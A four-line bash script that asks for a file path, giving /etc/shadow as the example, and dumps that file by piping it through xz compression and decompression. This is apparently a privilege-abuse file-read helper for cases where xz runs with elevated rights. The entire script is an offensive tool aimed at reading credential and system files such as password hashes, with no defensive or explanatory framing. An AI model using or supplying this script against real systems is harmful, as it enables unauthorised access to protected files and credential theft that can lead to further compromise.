#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
xz -c "$filepath" | xz -d
